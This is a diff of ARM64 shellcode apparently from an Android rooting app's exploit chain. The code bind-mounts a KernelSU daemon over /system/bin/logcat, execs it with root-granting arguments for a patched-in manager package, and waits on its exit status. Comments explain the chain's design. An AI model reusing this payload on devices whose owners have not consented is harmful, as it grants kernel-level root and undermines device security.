@@ -16,9 +16,16 @@ lib_path:
 mod_args:
     .asciz ""
 ksud_path:
-    .asciz "/dev/.ksud"
-ksud_staged_path:
-    .asciz "/data/system/ksud"
+    // The daemon, as a path the *app* wrote. This is the whole trick of upstream's change: the shellcode no
+    // longer copies anything - it bind-mounts this file over /system/bin/logcat and execs it - so the bytes
+    // are placed by the app, in the app's own directory, which it can write with no root and no shell. The
+    // chain only ever reads it.
+    //
+    // The package is this app's, and it is the one thing here that cannot be derived: the shellcode runs in
+    // a different process and has no way to learn which app staged the file. `UniversalRootContractTest`
+    // holds this string to the `applicationId` in app/build.gradle.kts, because a package rename would
+    // otherwise break rooting in a way that looks like the exploit failing.
+    .asciz "/data/data/dev.rushiranpise.rmgnext/ksud"
 logcat_path:
     .asciz "/system/bin/logcat"
 root_path:
@@ -26,33 +33,35 @@ root_path:
 mark_modprobe:
     .asciz "/dev/dfm0"
 mark_bind_ns:
-    .asciz "/dev/dfm3"
+    .asciz "/dev/dfm1"
 mark_bind_ok:
-    .asciz "/dev/dfm4"
+    .asciz "/dev/dfm2"
 mark_exec_fail:
-    .asciz "/dev/dfm6"
+    .asciz "/dev/dfm4"
 mark_ksud_ok:
-    .asciz "/dev/dfm5"
-    .global libc_ksud_proc_path_off
-libc_ksud_proc_path_off:
-    .int s2_ksud_proc_path - libc_data
-s2_ksud_proc_path:
-    .space 64
-
+    .asciz "/dev/dfm3"
 argv_prog:
     .asciz "logcat"
 argv_late:
     .asciz "late-load"
 argv_pkgname:
     .asciz "--package-name"
+// The package the daemon is told to serve, as a **slot the app fills in** rather than a string compiled
+// here. It is the one argument that differs per KernelSU: the daemon grants root to whatever package this
+// names, so a run on a KernelSU-Next phone has to say `com.rifsxd.ksunext` and one on ReSukiSU has to say
+// `com.resukisu.resukisu`. A compiled-in literal meant every flavour was handed KernelSU's name - which
+// clap accepts, because to it the value is opaque, so the run looked fine while the daemon was told to
+// serve a manager the phone may not even have.
+//
+// The offset is exported the same way `libc_soft_reboot_off` is, and for the same reason: the Java side
+// already patches one byte of this blob at runtime, so patching a string into it is the mechanism that
+// exists rather than a new one.
+    .balign 4
+    .global libc_package_off
+libc_package_off:
+    .int argv_ksu - libc_data
 argv_ksu:
-    .asciz "me.weishu.kernelsu"
-argv_stage_from:
-    .asciz "--stage-from"
-argv_ro_partitions:
-    .asciz "--ro-partitions"
-argv_soft_reboot:
-    .asciz "--soft-reboot"
+    .space 64
 
     .balign 4
     .global libc_soft_reboot_off
@@ -116,108 +125,6 @@ matched:
 
     create_mark mark_modprobe
 
-    // Copy ksud from memfd to /dev/.ksud (bind mount target) and /data/system/ksud (--stage-from).
-    sub  sp, sp, #272
-
-    create_mark s2_pre_mark
-
-    mov  x0, -100
-    adr  x1, s2_ksud_proc_path
-    mov  x2, O_RDONLY
-    mov  x3, xzr
-    mov  x8, #SYS_openat
-    svc  0
-    tbnz w0, #31, s2_cp_done
-    str  w0, [sp, 0]
-    create_mark s2_fail_mark
-
-    // copy 1: memfd -> /dev/.ksud (bind mount target)
-    mov  x0, -100
-    adr  x1, s2_dst_path
-    movl x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
-    mov  x3, 0755
-    mov  x8, #SYS_openat
-    svc  0
-    tbnz w0, #31, s2_cp2_start
-    str  w0, [sp, 4]
-s2_cp1_loop:
-    ldr  w0, [sp, 0]
-    add  x1, sp, 16
-    mov  x2, 256
-    mov  x8, #SYS_read
-    svc  0
-    cmp  x0, 0
-    ble  s2_cp1_close_dst
-    mov  x2, x0
-    ldr  w0, [sp, 4]
-    add  x1, sp, 16
-    mov  x8, #SYS_write
-    svc  0
-    b    s2_cp1_loop
-s2_cp1_close_dst:
-    ldr  w0, [sp, 4]
-    mov  x8, #SYS_close
-    svc  0
-    // seek src back to 0 for second copy
-    ldr  w0, [sp, 0]
-    mov  x1, xzr
-    mov  x2, xzr
-    mov  x8, #SYS_lseek
-    svc  0
-
-    // copy 2: memfd -> /data/system/ksud (--stage-from target)
-s2_cp2_start:
-    mov  x0, -100
-    adr  x1, s2_dst2_path
-    movl x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
-    mov  x3, 0755
-    mov  x8, #SYS_openat
-    svc  0
-    tbnz w0, #31, s2_cp_src_close
-    str  w0, [sp, 4]
-s2_cp2_loop:
-    ldr  w0, [sp, 0]
-    add  x1, sp, 16
-    mov  x2, 256
-    mov  x8, #SYS_read
-    svc  0
-    cmp  x0, 0
-    ble  s2_cp2_close_dst
-    mov  x2, x0
-    ldr  w0, [sp, 4]
-    add  x1, sp, 16
-    mov  x8, #SYS_write
-    svc  0
-    b    s2_cp2_loop
-s2_cp2_close_dst:
-    ldr  w0, [sp, 4]
-    mov  x8, #SYS_close
-    svc  0
-    b    s2_cp_src_close
-
-s2_cp_src_close:
-    ldr  w0, [sp, 0]
-    mov  x8, #SYS_close
-    svc  0
-
-s2_cp_done:
-    add  sp, sp, #272
-    b    s2_copy_strs_end
-    .balign 4
-s2_dst_path:
-    .asciz "/dev/.ksud"
-    .balign 4
-s2_dst2_path:
-    .asciz "/data/system/ksud"
-    .balign 4
-s2_pre_mark:
-    .asciz "/dev/dfm1"
-    .balign 4
-s2_fail_mark:
-    .asciz "/dev/dfm2"
-    .balign 4
-s2_copy_strs_end:
-
     sub sp, sp, 80
 
     create_mark mark_bind_ns
@@ -240,8 +147,7 @@ s2_copy_strs_end:
     create_mark mark_bind_ok
 
     // mount(ksud_path, logcat_path, NULL, MS_BIND, NULL)
-    adr x9, ksud_path
-    mov x0, x9
+    adr x0, ksud_path
     adr x1, logcat_path
     mov x2, xzr
     mov x3, MS_BIND
@@ -250,12 +156,16 @@ s2_copy_strs_end:
     svc 0
     cbnz w0, myexit
 
-    // x26=1: include --soft-reboot; x26=0: omit it.
-    adr     x9, soft_reboot_flag
-    ldrb    w26, [x9]
-
-    // argv = [logcat, late-load, --package-name,
-    //         me.weishu.kernelsu, --stage-from, ksud_staged_path, [--soft-reboot,] NULL]
+    // argv = [logcat, late-load, --package-name, me.weishu.kernelsu, NULL]
+    //
+    // Four arguments, and nothing after them. DFRoot's own argv ends `--ro-partitions [--soft-reboot]`, which
+    // are the two options **their fork** adds to `late-load`; the daemon this build drives is upstream's,
+    // built by our payload repository for this device's KMI, and it takes neither. A daemon handed an option
+    // it does not know exits at argument parsing, before it logs a line, and the chain never sees its stderr
+    // - so that mistake is silent, and the phone is left with a rooted kernel and no daemon.
+    //
+    // The two things those options did are the app's business instead, and it already does both: read-only
+    // partitions, and the reboot when the setting asks for one.
     adr x0, argv_prog
     str x0, [sp]
 
@@ -268,24 +178,8 @@ s2_copy_strs_end:
     adr x0, argv_ksu
     str x0, [sp, 24]
 
-    adr x0, argv_stage_from
-    str x0, [sp, 32]
-
-    adr x0, ksud_staged_path
-    str x0, [sp, 40]
-
-    adr x0, argv_ro_partitions
-    str x0, [sp, 48]
-
-    cbz     x26, no_soft_reboot
-    adr     x0, argv_soft_reboot
-    str     x0, [sp, 56]
-    b       fork_ksud
-no_soft_reboot:
-    str     xzr, [sp, 56]
+    str xzr, [sp, 32]
 fork_ksud:
-
-    // fork: child execve's ksud; parent marks success and exits
     movl x0, SIGCHLD
     mov x1, xzr
     mov x2, xzr
@@ -293,8 +187,8 @@ fork_ksud:
     mov x4, xzr
     mov x8, #SYS_clone
     svc 0
-    str x0, [sp, 64]    // child: 0 (64-bit NULL terminator); parent: child pid (branches away)
-    cbnz w0, s2_wait_ksud
+    str x0, [sp, 64]    // child: 0; parent: child pid
+    cbnz w0, wait_ksud
 
     // child: execve ksud (bind-mounted over logcat)
     adr x0, logcat_path
@@ -303,13 +197,25 @@ fork_ksud:
     mov x8, #SYS_execve
     svc 0
 
-    create_mark mark_exec_fail
     mov x0, #1
     mov x8, #SYS_exit
     svc #0
 
-s2_wait_ksud:
+wait_ksud:
+    ldr  x0, [sp, 64]
+    add  x1, sp, 72
+    mov  x2, xzr
+    mov  x3, xzr
+    mov  x8, #SYS_wait4
+    svc  0
+    ldr  w0, [sp, 72]
+    lsr  w0, w0, 8
+    and  w0, w0, #0xff
+    cbnz w0, ksud_failed
     create_mark mark_ksud_ok
+    b    myexit
+ksud_failed:
+    create_mark mark_exec_fail
 
 myexit:
     mov x0, #1
